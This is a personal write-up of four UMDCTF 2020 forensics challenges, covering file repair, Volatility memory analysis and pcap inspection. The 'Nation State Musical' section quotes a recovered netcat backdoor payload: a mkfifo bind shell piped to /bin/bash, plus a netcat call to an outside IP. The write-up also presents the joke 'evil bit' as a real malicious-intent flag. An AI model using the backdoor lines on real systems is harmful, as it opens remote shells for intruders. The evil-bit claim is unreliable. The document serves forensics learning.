---
title: "UMDCTF 2020 Forensics"
date: 2021-04-21T14:16:00+00:00
# weight: 1
# aliases: ["/first"]
tags: ["writeup", "forensics", "umdctf"]
author: "Me"
# author: ["Me", "You"] # multiple authors
showToc: true
TocOpen: true
draft: false
hidemeta: false
comments: false
description: "A writeup of forensics challenges for UMDCTF 2020"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
---

>
> **Team Members:**
> - itsecgary (solo *#rip*)
>
> https://ctftime.org/event/1040


---


## (forensics) Sensitive
**Category:** Forensics

**Points:** 150

**Description:**
> **Author:** Lumpus
>
> **Hint:** "Not sure what to make of this..."
>
> **Given:** File named "sensitive"

### Writeup
The file didn't have any extension added to the end so I couldn't
tell the type of file, so I ran the "file" command on Linux. It told
me it was a data file, which doesn't give much help.

I opened the file in **HxD** (a hex editor) and noticed that it was a PDF via
the header and footer.

PDF Header:
```
25 50 44 46 (in hex) = %PDF (in ASCII)
```

PDF Footer:
```
0A 25 25 45 4F 46 (.%%EOF)
0A 25 25 45 4F 46 0A (.%%EOF.)
0D 0A 25 25 45 4F 46 0D 0A (..%%EOF..)
0D 25 25 45 4F 46 0D (.%%EOF.)
```

After some analysis, I realized there was an extra "20" hex value for every
other character, which was probably the reason the file was corrupted. I tried
to find simple commands to do something like remove every other character, but
gave up on that.

I ended up writing a simple python program which did that for me and created
a new file. See script below:

This opened up a PDF with the UMD CSEC logo and a QR code that was VERY transparent.
All it took was a little messing around with the contrast and brightness and my QR
reader picked it up.

### Flag
UMDCTF-{l0v3-me_s0meh3x}

### Resources
- https://www.guru99.com/reading-and-writing-files-in-python.html

- https://mh-nexus.de/en/hxd/


---


## (forensics) Jarred1
**Category:** Forensics

**Points:** 200

**Description:**
> **Link:** https://drive.google.com/open?id=1g0j7rm53lU7ZRBM8XgkPkFpUgsfXpjfi
>
> **Files given:**
>
> **1.** System.map-5.3.0-18-generic
>
> **2.** module.dwarf
>
> **3.** lubuntu-Snapshot2.vmem

### Writeup
I didn't really know what to do with this at first because I was unfamiliar
with these types of files. After some research, I found that the System.map
and module.dwarf files are used to form a Linux profile. The other file is
a virual memory file which I think might be taken from a VM or just a linux
machine.

After more research, I figured I should clone **Volatility** code, which is how you
can load and analyze memory files.

1. In whichever directory, do a git clone on:
```
git clone https://github.com/volatilityfoundation/volatility.git
```

2. Package the System.map and module.dwarf files into a zip file
```
zip $(lsb_release -i -s)_$(uname -r)_profile.zip module.dwarf System.map-5.3.0-18-generic
```

3. Move the zip file to volatility/volatility/plugins/overlays/linux/

4. I got the profile name by running:
```
python vol.py --info | grep Linux
```
My profile name is LinuxUbuntu_4_4_0-17763-Microsoft_profilex64

5. You can figure out what you can get out of the memory by running:
```
python ./vol.py --info | grep -i linux_
```
We see that we can see the bash command history with linux_bash

6. The command to run is:
```
sudo python vol.py -f ../lubuntu-Snapshot2.vmem --profile=LinuxUbuntu_4_4_0-17763-Microsoft_profilex64 linux_bash
```

The output was:
```
Pid      Name                 Command Time                   Command
-------- -------------------- ------------------------------ -------
    1825 bash                 2019-11-13 03:59:04 UTC+0000   how do I linux?
    1825 bash                 2019-11-13 03:59:21 UTC+0000   UMDCTF-{falskdfklashdkjfhaskljfhakljsdhflkjasdhflkashdk}
    1825 bash                 2019-11-13 04:00:22 UTC+0000   echo -n "VU1EQ1RGLXtKYXJyZWRfU2gwdWxEX0hhVjNfTDBjazNkX0gxc19DT21wdTdlcn0=" | base64 -d | sha256sum
    1825 bash                 2019-11-13 04:01:32 UTC+0000   UMDCTF-{STRINgz_W0n't_Get_Th3_FLVG}
```

I obviously tried the last command as a flag, but it didn't work (shocker).
It looked like the 3rd command could be of use. I copied the command to my
terminal and ended up getting the flag: UMDCTF-{Jarred_Sh0ulD_HaV3_L0ck3d_H1s_COmpu7er}


### Flag
UMDCTF-{Jarred_Sh0ulD_HaV3_L0ck3d_H1s_COmpu7er}

### Resources
- https://www.linkedin.com/pulse/linux-memory-analysis-how-start-what-you-need-know-james-bower/

- https://github.com/volatilityfoundation/volatility/wiki/Linux

- https://resources.infosecinstitute.com/memory-forensics-and-analysis-using-volatility/#gref

- https://www.andreafortuna.org/2019/08/22/how-to-generate-a-volatility-profile-for-a-linux-system/


---


## (forensics) Nation State Musical
**Category:** Forensics

**Points:** 300

**Description:**
> **Author:** t0pc4r
>
> **Hint:** "Oh no! It looks like a nation state is trying to attack one
>        of UMDs routers! Using a pcap generated from the attack, try
>            to determine which nation state the attack is coming from.
>
>       Beware, you only have five guesses.
>
> The flag will be in the format UMDCTF-{Country}"
>
> **Note:** "Do not attempt to communicate with or contact any of
       the IP addresses mentioned in the challenge. The challenge
           can and should be solved statically."
>
> **Given:** Pcap file "attack.pcap"

### Writeup
Looking at the pcap file, we can see there are A LOT of TCP packets
from ONE source to ONE destination. I ran a whois on the source IP
address, which showed that the IP was from Ukraine, but that's too easy.

I looked at the pcap file a little more to realize that one of the TCP
packets had data associated to it. I did a quick hex to ascii and the
output was:

```
ÿþ';
rm -f backd00r
mkfifo backd00r
nc -lk 1337 0<backd00r | /bin/bash 1>backd00
echo '<5= :V@5<V=' | nc 37.46.96.0 1337
```

I can see that another IP addressed is being used, so I ran another whois
on this other IP. The IP was from Kazakhstan, so I tried the flag,
UMDCTF-{Kazakhstan} and it worked.

There is probably an explanation to why this IP address is the actual source
of the attacks, but I'm not too sure what it is.

### Flag
UMDCTF-{Kazakhstan}


---


## (forensics) Nefarious Bits
**Category:** Forensics

**Points:** 400

**Description:**
> **Author:** t0pc4r
>
> **Hint:** "After being exposed to some solar radiation, it looks like
>          some bits have turned bad. It is your job to figure out
>          what they are trying to say."
>
> **Note:** "Do not attempt to communicate with or contact any of
>       the IP addresses mentioned in the challenge. The challenge
>             can and should be solved statically."
>
> **Given:** Pcap file "attack.pcap"

### Writeup
When I opened the pcap file, there wasn't much to look at. Pretty much
just TCP transmissions from ONE source to ONE destination.

I noticed that a few fields were changing throughout the 200-something
packets in the file. The source port went up by one every time, the
TCP checksum changes by a constant little bit every time, and one of the
IPv4 flags were changing randomly.

With this knowledge, I didn't think I could do anything with the first two
fields I saw changing. It would make sense that the checksum was changed
by the source port changing every packet. I took a closer look at the IPv4
flag changing every time and saw it was called the "Reserved bit"

After some research, I found at that the **reserved bit** is used to indicate
whether a packet has been sent with malicious intent or not (1 or 0). With
this in mind, the fact that it was varying like binary data would vary, and
the hint, I assumed that the 200-something packets were using this field for
binary data.

I exported the pcap file to a CSV and removed all of the columns except for
the field I wanted. I named it "test.csv" for the script. My script printed
out the binary for this pcap. See script "nefarious.py"

### Flag
UMDCTF-{3vil_b1ts_@r3_4lw4ys_3vi1}

### Resources
- https://en.wikipedia.org/wiki/Evil_bit

